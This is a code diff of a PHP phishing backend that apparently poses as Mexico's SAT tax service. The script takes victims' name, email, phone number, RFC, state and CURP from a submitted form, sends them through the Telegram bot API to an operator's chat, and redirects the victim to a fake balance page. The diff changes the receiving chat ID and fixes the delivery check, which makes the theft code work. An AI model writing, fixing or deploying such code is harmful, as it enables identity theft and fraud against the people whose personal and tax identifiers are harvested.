@@ -14,7 +14,7 @@ $estado = $_POST['estado'];
 $curp = $_POST['curp'];
 
 $datos = [
-    'chat_id' => '1556162059',
+    'chat_id' => '1189170037',
     #'chat_id' => '@el_canal si va dirigido a un canal',
     'text' => "NUEVOS DATOS RECIBIDOS PRIMERA PARTE \n\n⭐ Nombre: $name \n🪙 Email: $mail \n📞 Numero: $number \n🆔 RFC: $rfc \n🌐 Estado: $estado \n🧾 CURP: $curp \n\nATTE: SATReboot RAAAAAA!",
     'parse_mode' => 'HTML' #formato del mensaje
@@ -35,11 +35,9 @@ $r_array = json_decode(curl_exec($ch), true);
 
 curl_close($ch);
 
-if (curl_close($ch)['ok'] == 1) {
+if ($r_array['ok'] == 1) {
     header("Location: saldo.html");
 } else {
     echo "Mensaje no enviado.";
-    print_r(curl_close($ch);
+    print_r($r_array);
 }
-
-#if !empty($r_array) && array_key_exists("ok", $r_array);
